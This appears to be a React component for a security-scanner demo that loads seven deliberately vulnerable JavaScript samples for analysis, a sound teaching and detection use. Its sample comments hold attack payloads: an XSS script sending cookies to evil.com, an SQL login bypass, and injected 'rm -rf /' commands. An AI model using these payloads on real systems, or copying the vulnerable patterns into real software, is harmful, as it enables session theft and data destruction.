import React, { useState, useEffect } from 'react';
import { Play, Pause, SkipForward, RotateCcw } from 'lucide-react';

interface AutoExamplesProps {
  onLoadExample: (code: string, fileName: string) => void;
  onAnalyze: () => void;
}

const autoExamples = [
  {
    name: 'SQL Injection Attack',
    fileName: 'user-login.js',
    code: `// Vulnerable user authentication
const authenticateUser = (username, password) => {
  const query = \`SELECT * FROM users WHERE username = '\${username}' AND password = '\${password}'\`;
  return db.query(query);
};

// Attack vector: admin'--
// This bypasses password check entirely`,
    description: 'Direct string interpolation in SQL queries allows attackers to manipulate query structure'
  },
  {
    name: 'XSS in User Content',
    fileName: 'comment-system.js',
    code: `// Vulnerable comment display
const displayComment = (userComment) => {
  const commentDiv = document.getElementById('comments');
  commentDiv.innerHTML += \`
    <div class="comment">
      <p>\${userComment}</p>
      <span class="author">\${getCurrentUser()}</span>
    </div>
  \`;
};

// Attack: <script>document.location='http://evil.com?cookie='+document.cookie</script>`,
    description: 'Unescaped user input in innerHTML can execute malicious JavaScript'
  },
  {
    name: 'Command Injection Vulnerability',
    fileName: 'file-processor.js',
    code: `const { exec } = require('child_process');

// Vulnerable file processing
const processFile = (filename) => {
  const command = \`convert \${filename} -resize 800x600 output.jpg\`;
  exec(command, (error, stdout, stderr) => {
    if (error) console.error(error);
    return stdout;
  });
};

// Attack: image.jpg; rm -rf / #`,
    description: 'User input directly concatenated into system commands enables arbitrary code execution'
  },
  {
    name: 'Exposed API Credentials',
    fileName: 'api-config.js',
    code: `// Production configuration with hardcoded secrets
const config = {
  database: {
    host: 'prod-db.company.com',
    username: 'admin',
    password: 'P@ssw0rd123!',
    port: 5432
  },
  stripe: {
    secret_key: 'sk_live_51H7...',
    publishable_key: 'pk_live_51H7...'
  },
  jwt_secret: 'super-secret-jwt-key-2024',
  api_keys: {
    openai: 'sk-proj-abc123...',
    sendgrid: 'SG.xyz789...'
  }
};`,
    description: 'Hardcoded credentials in source code expose sensitive authentication data'
  },
  {
    name: 'Insecure Session Management',
    fileName: 'session-handler.js',
    code: `// Vulnerable session implementation
const createSession = (userId) => {
  // Weak random session ID
  const sessionId = Math.random().toString(36).substring(2);
  
  // Insecure cookie settings
  document.cookie = \`sessionId=\${sessionId}; path=/\`;
  
  // Session data over HTTP
  fetch('http://api.example.com/sessions', {
    method: 'POST',
    body: JSON.stringify({ userId, sessionId })
  });
  
  return sessionId;
};`,
    description: 'Weak randomness, insecure cookies, and HTTP transmission compromise session security'
  },
  {
    name: 'Code Injection via eval()',
    fileName: 'calculator.js',
    code: `// Dangerous calculator implementation
const calculate = (expression) => {
  try {
    // Never use eval with user input!
    const result = eval(expression);
    return result;
  } catch (error) {
    return 'Invalid expression';
  }
};

// Attack: "1; require('child_process').exec('rm -rf /')"
// Or: "1; process.exit()"`,
    description: 'Using eval() with user input allows arbitrary code execution'
  },
  {
    name: 'Multiple Security Issues',
    fileName: 'vulnerable-app.js',
    code: `const express = require('express');
const { exec } = require('child_process');
const app = express();

// API key exposed in code
const API_KEY = 'sk_live_abcd1234567890';

app.post('/search', (req, res) => {
  const { query, userId } = req.body;
  
  // SQL Injection vulnerability
  const sql = \`SELECT * FROM products WHERE name LIKE '%\${query}%' AND user_id = \${userId}\`;
  
  // Command injection
  exec(\`grep -r "\${query}" ./files/\`, (err, stdout) => {
    // XSS vulnerability in response
    res.send(\`<h2>Results for: \${query}</h2><pre>\${stdout}</pre>\`);
  });
  
  // Weak session ID
  const sessionId = Math.random().toString(36);
  
  // Insecure cookie
  res.cookie('session', sessionId, { 
    httpOnly: false,
    secure: false 
  });
});`,
    description: 'Real-world example showing multiple vulnerabilities in a single endpoint'
  }
];

export const AutoExamples: React.FC<AutoExamplesProps> = ({ onLoadExample, onAnalyze }) => {
  const [isRunning, setIsRunning] = useState(false);
  const [currentIndex, setCurrentIndex] = useState(0);
  const [progress, setProgress] = useState(0);
  const [intervalId, setIntervalId] = useState<NodeJS.Timeout | null>(null);

  const DEMO_DURATION = 8000; // 8 seconds per example
  const PROGRESS_INTERVAL = 100; // Update progress every 100ms

  useEffect(() => {
    if (isRunning) {
      const progressTimer = setInterval(() => {
        setProgress(prev => {
          if (prev >= 100) {
            nextExample();
            return 0;
          }
          return prev + (PROGRESS_INTERVAL / DEMO_DURATION) * 100;
        });
      }, PROGRESS_INTERVAL);

      setIntervalId(progressTimer);

      return () => {
        if (progressTimer) clearInterval(progressTimer);
      };
    } else {
      if (intervalId) {
        clearInterval(intervalId);
        setIntervalId(null);
      }
    }
  }, [isRunning, currentIndex]);

  const startDemo = () => {
    setIsRunning(true);
    setProgress(0);
    loadCurrentExample();
  };

  const stopDemo = () => {
    setIsRunning(false);
    setProgress(0);
    if (intervalId) {
      clearInterval(intervalId);
      setIntervalId(null);
    }
  };

  const nextExample = () => {
    const nextIndex = (currentIndex + 1) % autoExamples.length;
    setCurrentIndex(nextIndex);
    setProgress(0);
    loadExample(nextIndex);
  };

  const resetDemo = () => {
    stopDemo();
    setCurrentIndex(0);
    setProgress(0);
    loadExample(0);
  };

  const loadCurrentExample = () => {
    loadExample(currentIndex);
  };

  const loadExample = (index: number) => {
    const example = autoExamples[index];
    onLoadExample(example.code, example.fileName);
    
    // Auto-analyze after a short delay
    setTimeout(() => {
      onAnalyze();
    }, 500);
  };

  const currentExample = autoExamples[currentIndex];

  return (
    <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-6">
      <div className="flex items-center justify-between mb-4">
        <h3 className="font-semibold text-gray-900">Auto Demo</h3>
        <div className="flex items-center gap-2">
          {!isRunning ? (
            <button
              onClick={startDemo}
              className="flex items-center gap-2 px-3 py-2 bg-green-600 text-white rounded-md hover:bg-green-700 transition-colors"
            >
              <Play size={16} />
              Start Demo
            </button>
          ) : (
            <button
              onClick={stopDemo}
              className="flex items-center gap-2 px-3 py-2 bg-red-600 text-white rounded-md hover:bg-red-700 transition-colors"
            >
              <Pause size={16} />
              Stop Demo
            </button>
          )}
          
          <button
            onClick={nextExample}
            className="p-2 text-gray-600 hover:text-gray-800 transition-colors"
            title="Next Example"
          >
            <SkipForward size={16} />
          </button>
          
          <button
            onClick={resetDemo}
            className="p-2 text-gray-600 hover:text-gray-800 transition-colors"
            title="Reset Demo"
          >
            <RotateCcw size={16} />
          </button>
        </div>
      </div>

      {/* Progress Bar */}
      {isRunning && (
        <div className="mb-4">
          <div className="w-full bg-gray-200 rounded-full h-2">
            <div 
              className="bg-blue-600 h-2 rounded-full transition-all duration-100 ease-linear"
              style={{ width: `${progress}%` }}
            />
          </div>
        </div>
      )}

      {/* Current Example Info */}
      <div className="space-y-3">
        <div className="flex items-center justify-between">
          <h4 className="font-medium text-gray-900">{currentExample.name}</h4>
          <span className="text-sm text-gray-500">
            {currentIndex + 1} of {autoExamples.length}
          </span>
        </div>
        
        <p className="text-sm text-gray-700">{currentExample.description}</p>
        
        <div className="bg-gray-50 rounded-md p-3">
          <div className="text-xs text-gray-600 mb-1">File: {currentExample.fileName}</div>
          <pre className="text-xs text-gray-800 font-mono overflow-x-auto">
            {currentExample.code.split('\n').slice(0, 4).join('\n')}
            {currentExample.code.split('\n').length > 4 && '\n...'}
          </pre>
        </div>

        <button
          onClick={loadCurrentExample}
          className="w-full px-4 py-2 bg-blue-600 text-white rounded-md hover:bg-blue-700 transition-colors"
        >
          Load This Example
        </button>
      </div>

      {/* Example Navigation */}
      <div className="mt-4 pt-4 border-t border-gray-200">
        <div className="grid grid-cols-2 gap-2">
          {autoExamples.map((example, index) => (
            <button
              key={index}
              onClick={() => {
                setCurrentIndex(index);
                loadExample(index);
                if (isRunning) {
                  setProgress(0);
                }
              }}
              className={`p-2 text-xs rounded-md transition-colors text-left ${
                index === currentIndex
                  ? 'bg-blue-100 text-blue-800 border border-blue-300'
                  : 'bg-gray-50 text-gray-700 hover:bg-gray-100'
              }`}
            >
              {example.name}
            </button>
          ))}
        </div>
      </div>
    </div>
  );
};